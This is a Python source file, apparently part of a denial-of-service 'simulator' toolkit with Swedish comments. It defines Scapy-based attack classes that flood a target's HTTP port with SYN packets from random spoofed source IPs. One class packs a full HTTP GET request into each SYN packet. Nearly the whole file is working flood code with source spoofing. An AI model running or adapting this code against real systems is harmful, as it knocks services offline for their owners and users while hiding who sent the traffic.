"""
HTTP Attack moduler
"""
from scapy.all import IP, TCP, Raw
import time
import random
from .base_attack import BaseAttack
from utils.network_utils import generate_random_ip, generate_random_port


class HTTPAttack(BaseAttack):
    """TCP SYN Flood mot HTTP"""

    def get_attack_name(self):
        return "HTTP SYN Flood"

    def execute(self, count=100, port=80):
        """Kör HTTP SYN flood"""
        self.print_header("HTTP SYN Flood Attack", port=port, count=count)

        self.start_time = time.time()
        self.packets_sent = 0

        for i in range(count):
            fake_source = generate_random_ip()
            fake_sport = generate_random_port()
            payload = f"{self.custom_message}_SYN_PKT_{i+1}".encode()

            packet = IP(src=fake_source, dst=self.target_ip)/ \
                     TCP(sport=fake_sport, dport=port, flags="S", 
                         seq=random.randint(1000, 9000))/ \
                     Raw(load=payload)

            self.send_packet(packet)

            if (i + 1) % 50 == 0:
                elapsed = time.time() - self.start_time
                pps = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"[+] SYN: {i + 1}/{count} paket skickade ({pps:.1f} pps)")

        self.log_attack("SYN_FLOOD", f"Port {port}, {count} packets sent with message: {self.custom_message}")
        self.print_summary()


class HTTPPayloadAttack(BaseAttack):
    """HTTP flood med full HTTP request payload"""

    def get_attack_name(self):
        return "HTTP Payload Flood"

    def execute(self, count=100):
        """Kör HTTP flood med komplett payload"""
        self.print_header("HTTP Flood med HTTP Request Payload", port=80, count=count)

        self.start_time = time.time()
        self.packets_sent = 0

        for i in range(count):
            fake_source = generate_random_ip()
            fake_sport = generate_random_port()

            http_request = f"""GET /test?attack={self.custom_message}&packet={i+1} HTTP/1.1
Host: {self.target_ip}
User-Agent: DoS-Simulator/1.0 ({self.custom_message})
X-Attack-ID: {self.custom_message}_PKT_{i+1}
X-Source-IP: {fake_source}
Connection: close

""".encode()

            packet = IP(src=fake_source, dst=self.target_ip)/ \
                     TCP(sport=fake_sport, dport=80, flags="S")/ \
                     Raw(load=http_request)

            self.send_packet(packet)

            if (i + 1) % 50 == 0:
                elapsed = time.time() - self.start_time
                pps = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"[+] HTTP: {i + 1}/{count} paket skickade ({pps:.1f} pps)")

        self.log_attack("HTTP_FLOOD", f"{count} packets sent with HTTP payload: {self.custom_message}")
        self.print_summary()
